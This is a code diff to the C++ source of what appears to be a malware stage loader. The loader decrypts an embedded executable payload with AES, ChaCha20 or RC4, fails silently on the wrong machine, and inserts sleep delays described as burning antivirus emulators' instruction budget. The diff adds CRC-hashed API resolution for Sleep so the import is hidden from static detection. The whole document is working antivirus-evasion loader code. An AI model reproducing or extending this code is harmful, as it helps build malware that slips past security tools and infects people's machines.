@@ -9,6 +9,7 @@
 // 
 
 #include "StageLoader.h"
+#include "ApiResolver.h"
 
 namespace StageLoader
 {
@@ -27,12 +28,20 @@ namespace StageLoader
         if (!encrypted || totalSize < 64 || !key || keyLen < 1)
             return false;
 
+        // Динамическое разрешение Sleep
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return false;
+
+        typedef void (WINAPI* pfnSleep)(DWORD);
+        pfnSleep pSleep = (pfnSleep)Api::GetProcByHashCrc(hK32, Api::CrcFn::Sleep);
+        if (!pSleep) return false;
+
         // ═══ For AES/ChaCha — can't split into chunks (block cipher / nonce-based) ═══
         // Instead: add anti-emulation delays AROUND the full decryption
         if (algo == Crypto::Algorithm::AES256 || algo == Crypto::Algorithm::ChaCha20)
         {
             // Stage 1: Anti-emulation delay before decryption
-            Sleep(50);
+            pSleep(50);
 
             // Stage 2: Full decrypt using proper algorithm
             Crypto::Decrypt(encrypted, (size_t)totalSize, key, (size_t)keyLen, algo);
@@ -42,7 +51,7 @@ namespace StageLoader
                 return false; // Wrong key / wrong machine → silent fail
 
             // Stage 4: Post-decrypt micro-delay (burns emulator budget)
-            Sleep(30);
+            pSleep(30);
 
             return true;
         }
@@ -53,13 +62,13 @@ namespace StageLoader
         {
             // RC4 is a stream cipher but stateful — must decrypt fully
             // Add staged delays around the full decryption
-            Sleep(50);
+            pSleep(50);
             Crypto::Decrypt(encrypted, (size_t)totalSize, key, (size_t)keyLen, algo);
 
             if (encrypted[0] != 'M' || encrypted[1] != 'Z')
                 return false;
 
-            Sleep(30);
+            pSleep(30);
             return true;
         }
 
@@ -77,7 +86,7 @@ namespace StageLoader
         }
 
         // Small delay — gives emulator time to give up
-        Sleep(50);
+        pSleep(50);
 
         // Stage 2: Decrypt rest in 4KB chunks with micro-delays
         int chunkSize = 4096;
@@ -96,7 +105,7 @@ namespace StageLoader
             // but forces AV emulators to actually emulate the delay
             // which burns their instruction budget
             if (offset < totalSize)
-                Sleep(1);
+                pSleep(1);
         }
 
         return true;
